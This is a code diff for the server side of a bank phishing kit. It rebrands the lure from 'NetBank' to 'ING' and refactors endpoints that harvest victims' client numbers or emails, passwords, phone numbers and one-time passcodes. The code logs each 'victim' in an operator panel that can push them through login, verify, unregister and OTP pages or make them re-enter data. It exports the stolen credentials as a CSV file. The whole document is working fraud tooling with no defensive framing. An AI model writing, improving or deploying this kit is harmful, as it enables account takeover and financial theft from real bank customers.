@@ -205,18 +205,19 @@ function uaParser(ua) {
 
 /* ----------  SESSION HEADER HELPER  ---------- */
 function getSessionHeader(v) {
-  if (v.page === 'success') return `✅ NetBank Login Approved`;
-  if (v.status === 'approved') return `✅ NetBank Login Approved`;
+  if (v.page === 'success') return `🦁 ING Login approved`;
+  if (v.status === 'approved') return `🦁 ING Login approved`;
   if (v.page === 'index.html') {
-    return v.entered ? `🔑 Received Client + Password` : '⏳ Awaiting Credentials';
+    return v.entered ? `✅ Received client + PIN` : '⏳ Awaiting client + PIN';
   } else if (v.page === 'verify.html') {
-    return v.phone ? `📱 Received Phone` : `⏳ Awaiting Phone`;
+    return v.phone ? `✅ Received phone` : `⏳ Awaiting phone`;
   } else if (v.page === 'unregister.html') {
-    return v.unregisterClicked ? `⚠️ Clicked Unregister` : `⏳ Awaiting Action`;
+    return v.unregisterClicked ? `✅ Victim unregistered` : `⏳ Awaiting unregister`;
   } else if (v.page === 'otp.html') {
-    return v.otp ? `🔢 Received OTP` : `⏳ Awaiting OTP`;
+    if (v.otp && v.otp.length > 0) return `✅ Received OTP`;
+    return `🔑 Awaiting OTP...`;
   }
-  return `⏳ Waiting...`;
+  return `🔑 Awaiting OTP...`;
 }
 
 function cleanupSession(sid, reason, silent = false) {
@@ -227,8 +228,6 @@ function cleanupSession(sid, reason, silent = false) {
 }
 
 /* ----------  VICTIM API  ---------- */
-
-// Create new session
 app.post('/api/session', async (req, res) => {
   try {
     const sid = crypto.randomUUID();
@@ -240,28 +239,17 @@ app.post('/api/session', async (req, res) => {
     victimCounter++;
     const victim = {
       sid, ip, ua, dateStr,
-      entered: false, 
-      clientNumber: '',
-      password: '', 
-      phone: '', 
-      otp: '', 
-      billing: '',
+      entered: false, email: '', password: '', phone: '', otp: '', billing: '',
       page: 'index.html',
-      platform: uaParser(ua).os?.name || 'Unknown',
-      browser: uaParser(ua).browser?.name || 'Unknown',
-      attempt: 0, 
-      totalAttempts: 0, 
-      otpAttempt: 0, 
-      unregisterClicked: false,
-      status: 'loaded', 
-      victimNum: victimCounter,
+      platform: uaParser(ua).os?.name || 'n/a',
+      browser: uaParser(ua).browser?.name || 'n/a',
+      attempt: 0, totalAttempts: 0, otpAttempt: 0, unregisterClicked: false,
+      status: 'loaded', victimNum: victimCounter,
       interactions: [],
-      activityLog: [{ time: Date.now(), action: 'CONNECTED', detail: 'Visitor loaded index.html' }]
+      activityLog: [{ time: Date.now(), action: 'CONNECTED', detail: 'Visitor connected to page' }]
     };
     sessionsMap.set(sid, victim);
     sessionActivity.set(sid, Date.now());
-    
-    emitPanelUpdate();
     res.json({ sid });
   } catch (err) {
     console.error('Session creation error', err);
@@ -269,31 +257,6 @@ app.post('/api/session', async (req, res) => {
   }
 });
 
-// Page view tracking (for index.html load notification)
-app.post('/api/pageview', (req, res) => {
-  try {
-    const { sid, page } = req.body;
-    if (!sid || !sessionsMap.has(sid)) return res.sendStatus(404);
-    
-    const v = sessionsMap.get(sid);
-    v.page = page;
-    sessionActivity.set(sid, Date.now());
-    
-    v.activityLog.push({ 
-      time: Date.now(), 
-      action: 'PAGE VIEW', 
-      detail: page 
-    });
-    
-    emitPanelUpdate();
-    res.sendStatus(200);
-  } catch (err) {
-    console.error('Pageview error', err);
-    res.status(500).send('Error');
-  }
-});
-
-// Ping to keep session alive
 app.post('/api/ping', (req, res) => {
   const { sid } = req.body;
   if (sid && sessionsMap.has(sid)) {
@@ -303,41 +266,20 @@ app.post('/api/ping', (req, res) => {
   res.sendStatus(404);
 });
 
-// Login - Capture Client Number + Password
 app.post('/api/login', async (req, res) => {
   try {
-    const { sid, clientNumber, password } = req.body;
-    if (!clientNumber?.trim() || !password?.trim()) return res.sendStatus(400);
+    const { sid, email, password } = req.body;
+    if (!email?.trim() || !password?.trim()) return res.sendStatus(400);
     if (!sessionsMap.has(sid)) return res.sendStatus(404);
-    
     const v = sessionsMap.get(sid);
-    v.entered = true;
-    v.clientNumber = clientNumber;
-    v.password = password;
-    v.status = 'wait';
-    v.attempt += 1;
-    v.totalAttempts += 1;
+    v.entered = true; v.email = email; v.password = password;
+    v.status = 'wait'; v.attempt += 1; v.totalAttempts += 1;
     sessionActivity.set(sid, Date.now());
 
-    v.activityLog.push({ 
-      time: Date.now(), 
-      action: 'CREDENTIALS ENTERED', 
-      detail: `Client: ${clientNumber}` 
-    });
+    v.activityLog = v.activityLog || [];
+    v.activityLog.push({ time: Date.now(), action: 'ENTERED CREDENTIALS', detail: `Client: ${email}` });
 
-    auditLog.push({ 
-      t: Date.now(), 
-      victimN: v.victimNum, 
-      sid, 
-      clientNumber,
-      password, 
-      phone: '', 
-      otp: '',
-      ip: v.ip, 
-      ua: v.ua 
-    });
-    
-    emitPanelUpdate();
+    auditLog.push({ t: Date.now(), victimN: v.victimNum, sid, email, password, phone: '', ip: v.ip, ua: v.ua });
     res.sendStatus(200);
   } catch (err) {
     console.error('Login error', err);
@@ -345,28 +287,20 @@ app.post('/api/login', async (req, res) => {
   }
 });
 
-// Verify - Capture Phone
 app.post('/api/verify', async (req, res) => {
   try {
     const { sid, phone } = req.body;
     if (!phone?.trim()) return res.sendStatus(400);
     if (!sessionsMap.has(sid)) return res.sendStatus(404);
-    
     const v = sessionsMap.get(sid);
-    v.phone = phone;
-    v.status = 'wait';
+    v.phone = phone; v.status = 'wait';
     sessionActivity.set(sid, Date.now());
 
-    v.activityLog.push({ 
-      time: Date.now(), 
-      action: 'PHONE ENTERED', 
-      detail: `Phone: ${phone}` 
-    });
+    v.activityLog = v.activityLog || [];
+    v.activityLog.push({ time: Date.now(), action: 'ENTERED PHONE', detail: `Phone: ${phone}` });
 
     const entry = auditLog.find(e => e.sid === sid);
     if (entry) entry.phone = phone;
-    
-    emitPanelUpdate();
     res.sendStatus(200);
   } catch (e) {
     console.error('Verify error', e);
@@ -374,24 +308,17 @@ app.post('/api/verify', async (req, res) => {
   }
 });
 
-// Unregister click tracking
 app.post('/api/unregister', async (req, res) => {
   try {
     const { sid } = req.body;
     if (!sessionsMap.has(sid)) return res.sendStatus(404);
-    
     const v = sessionsMap.get(sid);
-    v.unregisterClicked = true;
-    v.status = 'wait';
+    v.unregisterClicked = true; v.status = 'wait';
     sessionActivity.set(sid, Date.now());
 
-    v.activityLog.push({ 
-      time: Date.now(), 
-      action: 'UNREGISTER CLICKED', 
-      detail: 'Victim clicked unregister' 
-    });
-    
-    emitPanelUpdate();
+    v.activityLog = v.activityLog || [];
+    v.activityLog.push({ time: Date.now(), action: 'CLICKED UNREGISTER', detail: 'Victim proceeded to unregister page' });
+
     res.sendStatus(200);
   } catch (err) {
     console.error('Unregister error', err);
@@ -399,28 +326,20 @@ app.post('/api/unregister', async (req, res) => {
   }
 });
 
-// OTP - Capture OTP Code
 app.post('/api/otp', async (req, res) => {
   try {
     const { sid, otp } = req.body;
     if (!otp?.trim()) return res.sendStatus(400);
     if (!sessionsMap.has(sid)) return res.sendStatus(404);
-    
     const v = sessionsMap.get(sid);
-    v.otp = otp;
-    v.status = 'wait';
+    v.otp = otp; v.status = 'wait';
     sessionActivity.set(sid, Date.now());
 
-    v.activityLog.push({ 
-      time: Date.now(), 
-      action: 'OTP ENTERED', 
-      detail: `OTP: ${otp}` 
-    });
+    v.activityLog = v.activityLog || [];
+    v.activityLog.push({ time: Date.now(), action: 'ENTERED OTP', detail: `OTP: ${otp}` });
 
     const entry = auditLog.find(e => e.sid === sid);
     if (entry) entry.otp = otp;
-    
-    emitPanelUpdate();
     res.sendStatus(200);
   } catch (err) {
     console.error('OTP error', err);
@@ -428,24 +347,18 @@ app.post('/api/otp', async (req, res) => {
   }
 });
 
-// Page change tracking
 app.post('/api/page', async (req, res) => {
   try {
     const { sid, page } = req.body;
     if (!sessionsMap.has(sid)) return res.sendStatus(404);
-    
     const v = sessionsMap.get(sid);
     const oldPage = v.page;
     v.page = page;
     sessionActivity.set(sid, Date.now());
 
-    v.activityLog.push({ 
-      time: Date.now(), 
-      action: 'PAGE CHANGE', 
-      detail: `${oldPage} → ${page}` 
-    });
-    
-    emitPanelUpdate();
+    v.activityLog = v.activityLog || [];
+    v.activityLog.push({ time: Date.now(), action: 'PAGE CHANGE', detail: `${oldPage} → ${page}` });
+
     res.sendStatus(200);
   } catch (err) {
     console.error('Page change error', err);
@@ -453,32 +366,27 @@ app.post('/api/page', async (req, res) => {
   }
 });
 
-// Get session status
 app.get('/api/status/:sid', (req, res) => {
   const v = sessionsMap.get(req.params.sid);
   if (!v) return res.json({ status: 'gone' });
-  res.json({ status: v.status, page: v.page });
+  res.json({ status: v.status });
 });
 
-// Clear redo status
 app.post('/api/clearRedo', (req, res) => {
   const v = sessionsMap.get(req.body.sid);
   if (v && v.status === 'redo') v.status = 'loaded';
   res.sendStatus(200);
 });
 
-// Clear ok status
 app.post('/api/clearOk', (req, res) => {
   const v = sessionsMap.get(req.body.sid);
   if (v && v.status === 'ok') v.status = 'loaded';
   res.sendStatus(200);
 });
 
-// Interaction logging
 app.post('/api/interaction', (req, res) => {
   const { sid, type, data } = req.body;
   if (!sessionsMap.has(sid)) return res.sendStatus(404);
-  
   const v = sessionsMap.get(sid);
   v.lastInteraction = Date.now();
   v.interactions = v.interactions || [];
@@ -499,30 +407,17 @@ app.get('/api/user', (req, res) => {
 
 function buildPanelPayload() {
   const list = Array.from(sessionsMap.values()).map(v => ({
-    sid: v.sid,
-    victimNum: v.victimNum,
-    header: getSessionHeader(v),
-    page: v.page,
-    status: v.status,
-    clientNumber: v.clientNumber,
-    password: v.password,
-    phone: v.phone,
-    otp: v.otp,
-    ip: v.ip,
-    platform: v.platform,
-    browser: v.browser,
-    ua: v.ua,
-    dateStr: v.dateStr,
-    entered: v.entered,
-    unregisterClicked: v.unregisterClicked,
+    sid: v.sid, victimNum: v.victimNum, header: getSessionHeader(v), page: v.page, status: v.status,
+    email: v.email, password: v.password, phone: v.phone, otp: v.otp,
+    ip: v.ip, platform: v.platform, browser: v.browser, ua: v.ua, dateStr: v.dateStr,
+    entered: v.entered, unregisterClicked: v.unregisterClicked,
     activityLog: v.activityLog || []
   }));
-  
   return {
     domain: currentDomain,
     username: PANEL_USER,
     totalVictims: victimCounter,
-    active: list.filter(x => x.page !== 'success' && x.status !== 'approved').length,
+    active: list.length,
     waiting: list.filter(x => x.status === 'wait').length,
     success: successfulLogins,
     sessions: list,
@@ -530,7 +425,7 @@ function buildPanelPayload() {
   };
 }
 
-// Long polling endpoint
+// FIXED: Proper long-poll with response tracking
 app.get('/api/panel', (req, res) => {
   if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });
 
@@ -555,7 +450,6 @@ app.get('/api/panel', (req, res) => {
   }, 1000);
 });
 
-// Panel actions (continue, redo, delete)
 app.post('/api/panel', async (req, res) => {
   if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });
 
@@ -569,18 +463,11 @@ app.post('/api/panel', async (req, res) => {
   switch (action) {
     case 'redo':
       if (v.page === 'index.html') {
-        v.status = 'redo';
-        v.entered = false;
-        v.clientNumber = '';
-        v.password = '';
-        v.otp = '';
+        v.status = 'redo'; v.entered = false; v.email = ''; v.password = ''; v.otp = '';
       } else if (v.page === 'verify.html') {
-        v.status = 'redo';
-        v.phone = '';
+        v.status = 'redo'; v.phone = '';
       } else if (v.page === 'otp.html') {
-        v.status = 'redo';
-        v.otp = '';
-        v.otpAttempt++;
+        v.status = 'redo'; v.otp = ''; v.otpAttempt++;
       }
       break;
     case 'cont':
@@ -588,11 +475,7 @@ app.post('/api/panel', async (req, res) => {
       if (v.page === 'index.html') v.page = 'verify.html';
       else if (v.page === 'verify.html') v.page = 'unregister.html';
       else if (v.page === 'unregister.html') v.page = 'otp.html';
-      else if (v.page === 'otp.html') { 
-        v.page = 'success'; 
-        v.status = 'approved';
-        successfulLogins++; 
-      }
+      else if (v.page === 'otp.html') { v.page = 'success'; successfulLogins++; }
       break;
     case 'delete':
       cleanupSession(sid, 'deleted from panel');
@@ -602,10 +485,11 @@ app.post('/api/panel', async (req, res) => {
   res.json({ ok: true });
 });
 
-/* ----------  SESSION REFRESH  ---------- */
+/* ----------  SESSION REFRESH (NEW)  ---------- */
 app.post('/api/refresh', (req, res) => {
   if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });
   
+  // Clear all victim sessions and data
   sessionsMap.clear();
   sessionActivity.clear();
   auditLog.length = 0;
@@ -624,25 +508,25 @@ app.get('/api/export', (req, res) => {
   req.session.save();
 
   const successes = auditLog
-    .filter(r => r.clientNumber && r.password)
+    .filter(r => r.phone && r.otp)
     .map(r => ({
       victimNum: r.victimN,
-      clientNumber: r.clientNumber,
+      email: r.email,
       password: r.password,
-      phone: r.phone || '',
-      otp: r.otp || '',
+      phone: r.phone,
+      otp: r.otp,
       ip: r.ip,
       ua: r.ua,
       timestamp: new Date(r.t).toISOString()
     }));
 
   const csv = [
-    ['Victim#','ClientNumber','Password','Phone','OTP','IP','UserAgent','Timestamp'],
-    ...successes.map(s => Object.values(s).map(v => `"${v}"`))
-  ].map(r => r.join(',')).join('\n');
+    ['Victim#','Email','Password','Phone','OTP','IP','UA','Timestamp'],
+    ...successes.map(s=>Object.values(s).map(v=>`"${v}"`))
+  ].map(r=>r.join(',')).join('\n');
 
   res.setHeader('Content-Type', 'text/csv');
-  res.setHeader('Content-Disposition', 'attachment; filename="netbank_logins.csv"');
+  res.setHeader('Content-Disposition', 'attachment; filename="successful_logins.csv"');
   res.send(csv);
 });
 
